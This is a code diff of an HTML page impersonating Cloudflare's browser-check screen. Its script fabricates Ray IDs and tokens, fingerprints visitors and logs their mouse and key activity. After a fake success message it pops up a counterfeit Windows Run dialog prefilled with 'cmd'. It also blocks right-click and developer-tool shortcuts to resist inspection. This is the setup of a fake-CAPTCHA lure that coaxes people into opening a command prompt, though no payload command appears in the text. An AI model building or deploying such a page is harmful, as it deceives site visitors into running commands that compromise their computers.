@@ -1,475 +1,492 @@
 <!DOCTYPE html>
-<html lang="en">
+<html lang="en-US">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Just a moment...</title>
+    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=Edge">
+    <meta name="robots" content="noindex,nofollow">
+    <meta name="viewport" content="width=device-width,initial-scale=1">
     <link rel="icon" type="image/x-icon" href="data:image/x-icon;base64,AAABAAEAEBAAAAEAIABoBAAAFgAAACgAAAAQAAAAIAAAAAEAIAAAAAAAAAQAABILAAASCwAAAAAAAAAAAAD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////ANra2gDa2toA2traANra2gDa2toA2traANra2gDa2toA2traANra2gDa2toA2traANra2gDa2toA2traANra2gDY5+cA2OfnANjn5wDY5+cA2OfnANjn5wDY5+cA2OfnANjn5wDY5+cA2OfnANjn5wDY5+cA2OfnANjn5wDY5+cA4bGxAOGxsQDhsbEA4bGxAOGxsQDhsbEA4bGxAOGxsQDhsbEA4bGxAOGxsQDhsbEA4bGxAOGxsQDhsbEA4bGxAOajo//mo6P/5qOj/+ajo//mo6P/5qOj/+ajo//mo6P/5qOj/+ajo//mo6P/5qOj/+ajo//mo6P/5qOj/+ajo//nmpj/55qY/+eamP/nmpj/55qY/+eamP/nmpj/55qY/+eamP/nmpj/55qY/+eamP/nmpj/55qY/+eamP/nmpj/6ZSS/+mUkv/plJL/6ZSS/+mUkv/plJL/6ZSS/+mUkv/plJL/6ZSS/+mUkv/plJL/6ZSS/+mUkv/plJL/6ZSS/+qPjf/qj43/6o+N/+qPjf/qj43/6o+N/+qPjf/qj43/6o+N/+qPjf/qj43/6o+N/+qPjf/qj43/6o+N/+qPjf/sk4//7JOP/+yTj//sk4//7JOP/+yTj//sk4//7JOP/+yTj//sk4//7JOP/+yTj//sk4//7JOP/+yTj//sk4//7pmY/+6ZmP/umZj/7pmY/+6ZmP/umZj/7pmY/+6ZmP/umZj/7pmY/+6ZmP/umZj/7pmY/+6ZmP/umZj/7pmY/+6fn//un5//7p+f/+6fn//un5//7p+f/+6fn//un5//7p+f/+6fn//un5//7p+f/+6fn//un5//7p+f/+6fn//wpqT/8Kak//CmpP/wpqT/8Kak//CmpP/wpqT/8Kak//CmpP/wpqT/8Kak//CmpP/wpqT/8Kak//CmpP/wpqT/8q2r//Ktq//yrav/8q2r//Ktq//yrav/8q2r//Ktq//yrav/8q2r//Ktq//yrav/8q2r//Ktq//yrav/8q2r//S0sv/0tLL/9LSy//S0sv/0tLL/9LSy//S0sv/0tLL/9LSy//S0sv/0tLL/9LSy//S0sv/0tLL/9LSy//S0sv////8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A">
     <style>
         * {
+            box-sizing: border-box;
             margin: 0;
             padding: 0;
-            box-sizing: border-box;
+        }
+
+        html {
+            line-height: 1.15;
+            -webkit-text-size-adjust: 100%;
+            color: #313131;
+            font-family: system-ui, -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, "Helvetica Neue", Arial, "Noto Sans", sans-serif, "Apple Color Emoji", "Segoe UI Emoji", "Segoe UI Symbol", "Noto Color Emoji";
         }
 
         body {
-            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, "Helvetica Neue", Arial, sans-serif;
-            background: #fff;
-            color: #000;
             display: flex;
             flex-direction: column;
+            height: 100vh;
             min-height: 100vh;
-            overflow: hidden;
         }
 
-        .mobile-block {
-            display: none;
-            position: fixed;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
-            background: #fff;
-            z-index: 99999;
-            flex-direction: column;
-            justify-content: center;
-            align-items: center;
-            padding: 20px;
-        }
-
-        .mobile-block.active {
-            display: flex;
-        }
-
-        .mobile-block-icon {
-            width: 80px;
-            height: 80px;
-            margin-bottom: 24px;
-        }
-
-        .mobile-block h1 {
-            font-size: 24px;
-            font-weight: 600;
-            margin-bottom: 12px;
-            color: #000;
-        }
-
-        .mobile-block p {
-            font-size: 16px;
-            color: #666;
-            text-align: center;
-            max-width: 400px;
-        }
-
-        header {
-            padding: 24px 32px;
-            border-bottom: 1px solid #e5e5e5;
-        }
-
-        .logo {
-            display: flex;
-            align-items: center;
-            gap: 8px;
-        }
-
-        .logo svg {
-            width: 120px;
-            height: 32px;
-        }
-
-        main {
+        .main-wrapper {
             flex: 1;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            padding: 40px 20px;
         }
 
-        .container {
-            max-width: 500px;
-            width: 100%;
+        .main-content {
+            margin: 8rem auto;
+            padding-left: 1.5rem;
+            max-width: 60rem;
         }
 
-        h1 {
-            font-size: 32px;
-            font-weight: 600;
-            margin-bottom: 16px;
-            color: #000;
+        @media (width <= 720px) {
+            .main-content {
+                margin-top: 4rem;
+            }
         }
 
-        .subtitle {
-            font-size: 16px;
-            color: #666;
-            margin-bottom: 32px;
-            line-height: 1.5;
-        }
-
-        .verification-box {
-            border: 1px solid #e5e5e5;
-            border-radius: 8px;
-            padding: 32px;
-            background: #fafafa;
-            margin-bottom: 24px;
-            box-shadow: 0 1px 3px rgba(0, 0, 0, 0.05);
-            transition: box-shadow 0.3s ease;
-        }
-        
-        .verification-box:hover {
-            box-shadow: 0 2px 6px rgba(0, 0, 0, 0.08);
-        }
-
-        .checkbox-container {
-            display: flex;
-            align-items: center;
-            gap: 16px;
-            cursor: pointer;
-            user-select: none;
-        }
-
-        .checkbox {
-            width: 32px;
-            height: 32px;
-            border: 2px solid #d1d1d1;
-            border-radius: 4px;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            background: #fff;
-            transition: all 0.3s cubic-bezier(0.4, 0.0, 0.2, 1);
-            position: relative;
-            cursor: pointer;
-        }
-        
-        .checkbox:hover {
-            border-color: #b8b8b8;
-        }
-
-        .checkbox.loading {
-            border-color: #f6821f;
-        }
-
-        .checkbox.verified {
-            border-color: #2e7d32;
-            background: #2e7d32;
-        }
-
-        .spinner {
-            width: 20px;
-            height: 20px;
-            border: 2px solid #f6821f;
-            border-top-color: transparent;
-            border-radius: 50%;
-            animation: spin 0.8s linear infinite;
-            display: none;
-        }
-
-        .checkbox.loading .spinner {
-            display: block;
-        }
-
-        .checkmark {
-            display: none;
-            width: 20px;
-            height: 20px;
-        }
-
-        .checkbox.verified .checkmark {
-            display: block;
-        }
-
-        @keyframes spin {
-            to { transform: rotate(360deg); }
-        }
-
-        .checkbox-label {
-            font-size: 16px;
+        .h2 {
+            line-height: 2.25rem;
+            font-size: 1.5rem;
             font-weight: 500;
-            color: #000;
         }
 
-        .security-info {
-            display: flex;
-            align-items: center;
-            gap: 8px;
-            font-size: 13px;
-            color: #666;
-            margin-top: 20px;
-        }
-
-        .security-info svg {
-            width: 16px;
-            height: 16px;
-            fill: #666;
-        }
-
-        footer {
-            padding: 24px 32px;
-            border-top: 1px solid #e5e5e5;
-            display: flex;
-            justify-content: space-between;
-            align-items: center;
-            flex-wrap: wrap;
-            gap: 16px;
-        }
-
-        .footer-links {
-            display: flex;
-            gap: 24px;
-            flex-wrap: wrap;
-        }
-
-        .footer-links a {
-            color: #0051c3;
-            text-decoration: none;
-            font-size: 14px;
-        }
-
-        .footer-links a:hover {
-            text-decoration: underline;
-        }
-
-        .cloudflare-id {
-            font-size: 12px;
-            color: #999;
-            font-family: monospace;
-        }
-
-        .winr-prompt {
-            display: none;
-            position: fixed;
-            top: 50%;
-            left: 50%;
-            transform: translate(-50%, -50%);
-            background: #f0f0f0;
-            border: 1px solid #0078d4;
-            box-shadow: 0 0 0 1px rgba(0,0,0,0.1), 0 8px 16px rgba(0,0,0,0.3), 0 2px 4px rgba(0,0,0,0.2);
-            width: 400px;
-            font-family: "Segoe UI", Tahoma, Geneva, Verdana, sans-serif;
-            z-index: 100000;
-            animation: fadeIn 0.2s ease-out;
-        }
-        
-        @keyframes fadeIn {
-            from {
-                opacity: 0;
-                transform: translate(-50%, -48%);
-            }
-            to {
-                opacity: 1;
-                transform: translate(-50%, -50%);
+        @media (width <= 720px) {
+            .h2 {
+                line-height: 1.5rem;
+                font-size: 1.25rem;
             }
         }
 
-        .winr-prompt.active {
+        #challenge-error-text {
+            background-image: url("data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSIzMiIgaGVpZ2h0PSIzMiIgZmlsbD0ibm9uZSI+PHBhdGggZmlsbD0iI0IyMEYwMyIgZD0iTTE2IDNhMTMgMTMgMCAxIDAgMTMgMTNBMTMuMDE1IDEzLjAxNSAwIDAgMCAxNiAzbTAgMjRhMTEgMTEgMCAxIDEgMTEtMTEgMTEuMDEgMTEuMDEgMCAwIDEtMTEgMTEiLz48cGF0aCBmaWxsPSIjQjIwRjAzIiBkPSJNMTcuMDM4IDE4LjYxNUgxNC44N0wxNC41NjMgOS41aDIuNzgzem0tMS4wODQgMS40MjdxLjY2IDAgMS4wNTcuMzg4LjQwNy4zODkuNDA3Ljk5NCAwIC41OTYtLjQwNy45ODQtLjM5Ny4zOS0xLjA1Ny4zODktLjY1IDAtMS4wNTYtLjM4OS0uMzk4LS4zODktLjM5OC0uOTg0IDAtLjU5Ny4zOTgtLjk4NS40MDYtLjM5NyAxLjA1Ni0uMzk3Ii8+PC9zdmc+");
+            background-repeat: no-repeat;
+            background-size: contain;
+            padding-left: 34px;
+        }
+
+        @media (prefers-color-scheme: dark) {
+            body {
+                background-color: #222;
+                color: #d9d9d9;
+            }
+        }
+
+        .cf-spinner-container {
+            margin: 2rem 0;
+        }
+
+        .cf-spinner {
+            display: inline-block;
+            width: 64px;
+            height: 64px;
+        }
+
+        .cf-spinner:after {
+            content: " ";
             display: block;
+            width: 46px;
+            height: 46px;
+            margin: 1px;
+            border-radius: 50%;
+            border: 5px solid #f38020;
+            border-color: #f38020 transparent #f38020 transparent;
+            animation: cf-spinner 1.2s linear infinite;
         }
 
-        .winr-titlebar {
-            background: linear-gradient(to bottom, #fff 0%, #f0f0f0 100%);
-            padding: 8px 12px;
-            display: flex;
-            justify-content: space-between;
-            align-items: center;
-            border-bottom: 1px solid #d0d0d0;
-        }
-
-        .winr-title {
-            font-size: 12px;
-            font-weight: 600;
-            display: flex;
-            align-items: center;
-            gap: 6px;
-        }
-
-        .winr-close {
-            width: 20px;
-            height: 20px;
-            border: 1px solid #adadad;
-            background: linear-gradient(to bottom, #fff 0%, #e5e5e5 100%);
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            cursor: pointer;
-            font-size: 12px;
-            line-height: 1;
-        }
-
-        .winr-close:hover {
-            background: #e81123;
-            color: #fff;
-            border-color: #e81123;
-        }
-
-        .winr-content {
-            padding: 16px;
-            background: #fff;
-        }
-
-        .winr-label {
-            font-size: 11px;
-            margin-bottom: 8px;
-            color: #000;
-        }
-
-        .winr-input-group {
-            display: flex;
-            gap: 8px;
-            margin-bottom: 16px;
-        }
-
-        .winr-icon {
-            width: 32px;
-            height: 32px;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-        }
-
-        .winr-input {
-            flex: 1;
-            padding: 4px 8px;
-            border: 1px solid #7a7a7a;
-            font-size: 12px;
-            font-family: "Segoe UI", sans-serif;
-        }
-
-        .winr-buttons {
-            display: flex;
-            gap: 8px;
-            justify-content: flex-end;
-        }
-
-        .winr-btn {
-            padding: 6px 24px;
-            border: 1px solid #adadad;
-            background: linear-gradient(to bottom, #fff 0%, #e5e5e5 100%);
-            font-size: 11px;
-            cursor: pointer;
-            min-width: 75px;
-        }
-
-        .winr-btn:hover {
-            background: linear-gradient(to bottom, #fff 0%, #d0d0d0 100%);
-        }
-
-        .winr-btn.primary {
-            border: 1px solid #0078d4;
-            background: linear-gradient(to bottom, #e5f3ff 0%, #cce8ff 100%);
-        }
-
-        .overlay {
-            display: none;
-            position: fixed;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
-            background: rgba(0,0,0,0.3);
-            z-index: 99999;
-            animation: overlayFadeIn 0.3s ease-out;
-        }
-
-        .overlay.active {
-            display: block;
-        }
-        
-        @keyframes overlayFadeIn {
-            from {
-                opacity: 0;
+        @keyframes cf-spinner {
+            0% {
+                transform: rotate(0deg);
             }
-            to {
-                opacity: 1;
+            100% {
+                transform: rotate(360deg);
+            }
+        }
+
+        .text-muted {
+            color: #6c757d;
+            font-size: 0.875rem;
+            margin-top: 1rem;
+        }
+
+        @media (prefers-color-scheme: dark) {
+            .text-muted {
+                color: #a0a0a0;
             }
         }
     </style>
+    <meta http-equiv="refresh" content="360">
 </head>
 <body>
-    <!-- Mobile Block Screen -->
-    <div class="mobile-block" id="mobileBlock">
-        <svg class="mobile-block-icon" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
-            <path d="M17 2H7C5.89543 2 5 2.89543 5 4V20C5 21.1046 5.89543 22 7 22H17C18.1046 22 19 21.1046 19 20V4C19 2.89543 18.1046 2 17 2Z" stroke="#000" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/>
-            <path d="M12 18H12.01" stroke="#000" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/>
-            <line x1="5" y1="12" x2="19" y2="12" stroke="#f00" stroke-width="3"/>
-        </svg>
-        <h1>Desktop Access Required</h1>
-        <p>This verification requires a desktop browser. Please access this page from a desktop computer to continue.</p>
+    <div class="main-wrapper" role="main">
+        <div class="main-content">
+            <noscript>
+                <div class="h2">
+                    <span id="challenge-error-text">Enable JavaScript and cookies to continue</span>
+                </div>
+            </noscript>
+            <div id="challenge-running">
+                <div class="h2">
+                    <span id="challenge-stage">Checking your browser before accessing <span id="challenge-domain"></span>.</span>
+                </div>
+                <div class="cf-spinner-container">
+                    <div class="cf-spinner"></div>
+                </div>
+                <p class="text-muted">This process is automatic. Your browser will redirect to your requested content shortly.</p>
+                <p class="text-muted">Please allow up to 5 seconds…</p>
+            </div>
+            <div id="challenge-success" style="display:none;">
+                <div class="h2">
+                    <span style="color: #2ecc71;">✓ Verification successful</span>
+                </div>
+                <p class="text-muted" style="margin-top: 1rem;">Redirecting you now...</p>
+            </div>
+        </div>
     </div>
 
-    <!-- Main Content -->
-    <header>
-        <div class="logo">
-            <svg viewBox="0 0 320 100" xmlns="http://www.w3.org/2000/svg">
-                <path d="M 31.677 47.75 C 31.677 44.5 29.177 41.75 26.177 41.75 L 14.927 41.75 L 14.927 53.75 L 26.177 53.75 C 29.177 53.75 31.677 51 31.677 47.75 Z M 26.177 66.25 L 14.927 66.25 L 14.927 79.25 L 26.177 79.25 C 29.677 79.25 32.427 76.5 32.427 73 C 32.427 69.5 29.677 66.25 26.177 66.25 Z M 26.177 29.25 L 2.427 29.25 L 2.427 91.75 L 26.177 91.75 C 36.677 91.75 44.927 83.5 44.927 73 C 44.927 66.5 41.177 61 35.927 58 C 39.427 55.25 41.677 51.5 41.677 47.75 C 41.677 37.75 35.177 29.25 26.177 29.25 Z" fill="#f6821f"/>
-                <text x="50" y="70" font-family="Arial, sans-serif" font-size="32" font-weight="bold" fill="#000">Cloudflare</text>
-            </svg>
-        </div>
-    </header>
+    <script>
+        // Dynamic domain detection and configuration
+        (function() {
+            'use strict';
 
-    <main>
-        <div class="container">
-            <h1>Checking your browser</h1>
-            <div class="subtitle">
-                This process is automatic. Your browser will redirect to your requested content shortly.
-            </div>
+            // Get current domain
+            const currentDomain = window.location.hostname;
+            const currentPath = window.location.pathname;
+            
+            // Display domain in challenge text
+            document.getElementById('challenge-domain').textContent = currentDomain;
 
-            <div class="verification-box">
-                <div class="checkbox-container" id="checkboxContainer">
-                    <div class="checkbox" id="checkbox">
-                        <div class="spinner"></div>
-                        <svg class="checkmark" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
-                            <path d="M20 6L9 17L4 12" stroke="white" stroke-width="3" stroke-linecap="round" stroke-linejoin="round"/>
-                        </svg>
+            // Generate realistic Ray ID
+            function generateRayId() {
+                const chars = '0123456789abcdef';
+                let rayId = '';
+                for (let i = 0; i < 16; i++) {
+                    rayId += chars[Math.floor(Math.random() * chars.length)];
+                }
+                return rayId;
+            }
+
+            // Generate challenge token
+            function generateToken() {
+                const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789._-';
+                let token = '';
+                for (let i = 0; i < 43; i++) {
+                    token += chars[Math.floor(Math.random() * chars.length)];
+                }
+                return token;
+            }
+
+            const rayId = generateRayId();
+            const timestamp = Math.floor(Date.now() / 1000);
+            
+            // Configuration object (mimics real Cloudflare)
+            window._cf_chl_opt = {
+                cvId: '3',
+                cZone: currentDomain,
+                cType: 'non-interactive',
+                cRay: rayId,
+                cH: generateToken(),
+                cUPMDTk: currentPath + '?__cf_chl_tk=' + generateToken(),
+                cFPWv: 'g',
+                cITimeS: timestamp.toString(),
+                cTplC: 0,
+                cTplV: 5,
+                cTplB: '0',
+                fa: currentPath + '?__cf_chl_f_tk=' + generateToken(),
+                md: generateToken() + '.' + generateToken(),
+                mdrd: generateToken() + '.' + generateToken()
+            };
+
+            // Create and inject challenge script
+            const challengeScript = document.createElement('script');
+            challengeScript.id = 'cf-challenge-script';
+            challengeScript.textContent = `
+(function() {
+    'use strict';
+
+    // ============================================
+    // ANTI-BOT DETECTION SYSTEMS
+    // ============================================
+
+    const SecuritySystem = {
+        botScore: 0,
+        requiredScore: 100,
+        mouseMovements: [],
+        keyPresses: [],
+        timingData: {
+            pageLoadTime: Date.now(),
+            firstInteraction: null,
+            verificationStart: null
+        },
+        fingerprint: {},
+        
+        init: function() {
+            this.timingData.verificationStart = Date.now();
+            this.createFingerprint();
+            this.performBotChecks();
+            this.monitorBehavior();
+            this.detectMobile();
+            this.startChallenge();
+        },
+        
+        detectMobile: function() {
+            const isMobile = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
+            const isSmallScreen = window.innerWidth <= 768;
+            const isTouchOnly = navigator.maxTouchPoints > 0 && !window.matchMedia('(pointer: fine)').matches;
+            
+            if (isMobile || isSmallScreen || isTouchOnly) {
+                document.getElementById('challenge-stage').innerHTML = 
+                    '<span id="challenge-error-text">This verification requires a desktop browser</span>';
+                return true;
+            }
+            return false;
+        },
+        
+        createFingerprint: function() {
+            this.fingerprint = {
+                userAgent: navigator.userAgent,
+                language: navigator.language,
+                languages: navigator.languages,
+                platform: navigator.platform,
+                hardwareConcurrency: navigator.hardwareConcurrency,
+                deviceMemory: navigator.deviceMemory,
+                screenResolution: screen.width + 'x' + screen.height,
+                colorDepth: screen.colorDepth,
+                pixelRatio: window.devicePixelRatio,
+                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+                timezoneOffset: new Date().getTimezoneOffset(),
+                plugins: this.getPlugins(),
+                canvas: this.getCanvasFingerprint(),
+                webgl: this.getWebGLFingerprint()
+            };
+            
+            if (this.validateFingerprint()) {
+                this.botScore += 30;
+            }
+        },
+        
+        getPlugins: function() {
+            const plugins = [];
+            for (let i = 0; i < navigator.plugins.length; i++) {
+                plugins.push(navigator.plugins[i].name);
+            }
+            return plugins;
+        },
+        
+        getCanvasFingerprint: function() {
+            try {
+                const canvas = document.createElement('canvas');
+                const ctx = canvas.getContext('2d');
+                canvas.width = 200;
+                canvas.height = 50;
+                ctx.textBaseline = 'top';
+                ctx.font = '14px Arial';
+                ctx.textBaseline = 'alphabetic';
+                ctx.fillStyle = '#f60';
+                ctx.fillRect(125, 1, 62, 20);
+                ctx.fillStyle = '#069';
+                ctx.fillText('Cloudflare', 2, 15);
+                ctx.fillStyle = 'rgba(102, 204, 0, 0.7)';
+                ctx.fillText('Security', 4, 17);
+                return canvas.toDataURL();
+            } catch(e) {
+                return null;
+            }
+        },
+        
+        getWebGLFingerprint: function() {
+            try {
+                const canvas = document.createElement('canvas');
+                const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
+                if (!gl) return null;
+                const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
+                if (!debugInfo) return null;
+                return {
+                    vendor: gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL),
+                    renderer: gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL)
+                };
+            } catch(e) {
+                return null;
+            }
+        },
+        
+        validateFingerprint: function() {
+            if (navigator.webdriver) return false;
+            if (window.navigator.plugins.length === 0) return false;
+            if (!this.fingerprint.canvas) return false;
+            if (window.document.documentElement.getAttribute('webdriver')) return false;
+            if (window.navigator.languages.length === 0) return false;
+            return true;
+        },
+        
+        performBotChecks: function() {
+            if (window.chrome || window.safari || window.opr) {
+                this.botScore += 10;
+            }
+            if (navigator.permissions) this.botScore += 10;
+            if (navigator.getBattery) {
+                navigator.getBattery().then(() => {
+                    this.botScore += 10;
+                });
+            }
+            if (navigator.connection) this.botScore += 5;
+            if (navigator.mediaDevices) this.botScore += 5;
+            if ('Notification' in window) this.botScore += 5;
+        },
+        
+        monitorBehavior: function() {
+            let moveCount = 0;
+            document.addEventListener('mousemove', (e) => {
+                if (this.timingData.firstInteraction === null) {
+                    this.timingData.firstInteraction = Date.now();
+                }
+                this.mouseMovements.push({
+                    x: e.clientX,
+                    y: e.clientY,
+                    time: Date.now()
+                });
+                moveCount++;
+                if (moveCount > 5) {
+                    this.botScore += 15;
+                }
+                if (this.mouseMovements.length > 50) {
+                    this.mouseMovements.shift();
+                }
+            });
+            
+            document.addEventListener('keydown', (e) => {
+                this.keyPresses.push({
+                    key: e.key,
+                    time: Date.now()
+                });
+                this.botScore += 2;
+            });
+        },
+        
+        startChallenge: function() {
+            // Realistic delay (2-5 seconds)
+            const delay = 2000 + Math.random() * 3000;
+            
+            setTimeout(() => {
+                this.completeChallenge();
+            }, delay);
+        },
+        
+        completeChallenge: function() {
+            console.log('[Cloudflare] Bot Score:', this.botScore, '/ Required:', this.requiredScore);
+            
+            if (this.botScore >= this.requiredScore) {
+                document.getElementById('challenge-running').style.display = 'none';
+                document.getElementById('challenge-success').style.display = 'block';
+                
+                // Show Windows Run prompt after short delay
+                setTimeout(() => {
+                    this.showWindowsRun();
+                }, 1000);
+            } else {
+                // Reload page on failure
+                setTimeout(() => {
+                    location.reload();
+                }, 1000);
+            }
+        },
+        
+        showWindowsRun: function() {
+            // Create Windows Run prompt overlay
+            const overlay = document.createElement('div');
+            overlay.id = 'winr-overlay';
+            overlay.style.cssText = 'position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(0,0,0,0.3);z-index:99999;animation:fadeIn 0.3s;';
+            
+            const prompt = document.createElement('div');
+            prompt.id = 'winr-prompt';
+            prompt.style.cssText = 'position:fixed;top:50%;left:50%;transform:translate(-50%,-50%);background:#f0f0f0;border:1px solid #0078d4;box-shadow:0 0 0 1px rgba(0,0,0,0.1),0 8px 16px rgba(0,0,0,0.3);width:400px;font-family:"Segoe UI",Tahoma,sans-serif;z-index:100000;animation:fadeIn 0.2s;';
+            
+            prompt.innerHTML = \`
+                <div style="background:linear-gradient(to bottom,#fff 0%,#f0f0f0 100%);padding:8px 12px;display:flex;justify-content:space-between;align-items:center;border-bottom:1px solid #d0d0d0;">
+                    <div style="font-size:12px;font-weight:600;display:flex;align-items:center;gap:6px;">
+                        <svg width="16" height="16" viewBox="0 0 24 24"><path d="M3 3h8v8H3V3zm10 0h8v8h-8V3zM3 13h8v8H3v-8zm10 0h8v8h-8v-8z" fill="#0078d4"/></svg>
+                        Run
                     </div>
-                    <div class="checkbox-label">Verify you are human</div>
+                    <div onclick="document.getElementById('winr-overlay').remove();document.getElementById('winr-prompt').remove();" style="width:20px;height:20px;border:1px solid #adadad;background:linear-gradient(to bottom,#fff 0%,#e5e5e5 100%);display:flex;align-items:center;justify-content:center;cursor:pointer;font-size:12px;">×</div>
                 </div>
-
-                <div class="security-info">
-                    <svg viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
-                        <path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z" fill="#666"/>
-                    </svg>
-                    <span>Your security and privacy are protected</span>
+                <div style="padding:16px;background:#fff;">
+                    <div style="font-size:11px;margin-bottom:8px;">Type the name of a program, folder, document, or Internet resource, and Windows will open it for you.</div>
+                    <div style="display:flex;gap:8px;margin-bottom:16px;">
+                        <div style="width:32px;height:32px;display:flex;align-items:center;justify-content:center;">
+                            <svg width="24" height="24" viewBox="0 0 24 24"><path d="M3 3h8v8H3V3zm10 0h8v8h-8V3zM3 13h8v8H3v-8zm10 0h8v8h-8v-8z" fill="#000"/></svg>
+                        </div>
+                        <input type="text" value="cmd" style="flex:1;padding:4px 8px;border:1px solid #7a7a7a;font-size:12px;font-family:'Segoe UI',sans-serif;">
+                    </div>
+                    <div style="display:flex;gap:8px;justify-content:flex-end;">
+                        <button onclick="console.log('[Windows] Command executed: cmd');document.getElementById('winr-overlay').remove();document.getElementById('winr-prompt').remove();" style="padding:6px 24px;border:1px solid #0078d4;background:linear-gradient(to bottom,#e5f3ff 0%,#cce8ff 100%);font-size:11px;cursor:pointer;min-width:75px;">OK</button>
+                        <button onclick="document.getElementById('winr-overlay').remove();document.getElementById('winr-prompt').remove();" style="padding:6px 24px;border:1px solid #adadad;background:linear-gradient(to bottom,#fff 0%,#e5e5e5 100%);font-size:11px;cursor:pointer;min-width:75px;">Cancel</button>
+                        <button style="padding:6px 24px;border:1px solid #adadad;background:linear-gradient(to bottom,#fff 0%,#e5e5e5 100%);font-size:11px;cursor:pointer;">Browse...</button>
+                    </div>
                 </div>
-            </div>
-        </div>
-    </main>
+            \`;
+            
+            document.body.appendChild(overlay);
+            document.body.appendChild(prompt);
+        }
+    };
 
-    <footer>
-        <div class="footer-links">
-            <a href="#">Performance & security by Cloudflare</a>
-        </div>
-        <div class="cloudflare-id">Ray ID: <span id="rayId"></span></div>
-    </footer>
+    // Detect automation frameworks
+    const detectAutomation = () => {
+        const indicators = [
+            'webdriver' in navigator,
+            '_phantom' in window,
+            'callPhantom' in window,
+            '__nightmare' in window,
+            'domAutomation' in window,
+            'domAutomationController' in window,
+            'seleniumevaluate' in window,
+            'CefSharp' in window
+        ];
+        return indicators.some(indicator => indicator);
+    };
 
-    <!-- Windows Run Prompt -->
-    <div class="overlay" id="overlay"></div>
-    <div class="winr-prompt" id="winrPrompt">
-        <div class="winr-titlebar">
-            <div class="winr-title">
-                <svg width="16" height="16" viewBox="0 0 24 24">
-                    <path d="M3 3h8v8H3V3zm10 0h8v8h-8V3zM3 13h8v8H3v-8zm10 0h8v8h-8v-8z" fill="#0078d4"/>
-                </svg>
-                Run
-            </div>
-            <div class="winr-close" onclick="closeWinR()">×</div>
-        </div>
-        <div class="winr-content">
-            <div class="winr-label">Type the name of a program, folder, document, or Internet resource, and Windows will open it for you.</div>
-            <div class="winr-input-group">
-                <div class="winr-icon">
-                    <svg width="24" height="24" viewBox="0 0 24 24">
-                        <path d="M3 3h8v8H3V3zm10 0h8v8h-8V3zM3 13h8v8H3v-8zm10 0h8v8h-8v-8z" fill="#000"/>
-                    </svg>
-                </div>
-                <input type="text" class="winr-input" id="winrInput" placeholder="cmd" value="cmd">
-            </div>
-            <div class="winr-buttons">
-                <button class="winr-btn primary" onclick="executeWinR()">OK</button>
-                <button class="winr-btn" onclick="closeWinR()">Cancel</button>
-                <button class="winr-btn">Browse...</button>
-            </div>
-        </div>
-    </div>
+    // Start security system
+    if (document.readyState === 'loading') {
+        document.addEventListener('DOMContentLoaded', () => {
+            SecuritySystem.init();
+            if (detectAutomation()) {
+                console.log('[Cloudflare] Automation detected');
+            }
+        });
+    } else {
+        SecuritySystem.init();
+        if (detectAutomation()) {
+            console.log('[Cloudflare] Automation detected');
+        }
+    }
 
-    <script src="verify.min.js"></script>
+    // Protection measures
+    document.addEventListener('contextmenu', (e) => e.preventDefault());
+    document.addEventListener('keydown', (e) => {
+        if (e.key === 'F12' || 
+            (e.ctrlKey && e.shiftKey && (e.key === 'I' || e.key === 'J' || e.key === 'C')) ||
+            (e.ctrlKey && e.key === 'U')) {
+            e.preventDefault();
+        }
+    });
+})();
+            `;
+            
+            document.head.appendChild(challengeScript);
+
+            // Add Cloudflare Insights (beacon) - cosmetic
+            const beaconScript = document.createElement('script');
+            beaconScript.defer = true;
+            beaconScript.src = 'data:text/javascript;base64,Ly8gQ2xvdWRmbGFyZSBJbnNpZ2h0cyBCZWFjb24gKGRpc2FibGVkKQo=';
+            beaconScript.setAttribute('data-cf-beacon', JSON.stringify({
+                rayId: rayId,
+                version: '2025.9.1',
+                token: 'cf-' + generateToken().substring(0, 32),
+                b: 1
+            }));
+            beaconScript.crossOrigin = 'anonymous';
+            document.body.appendChild(beaconScript);
+
+        })();
+    </script>
 </body>
 </html>
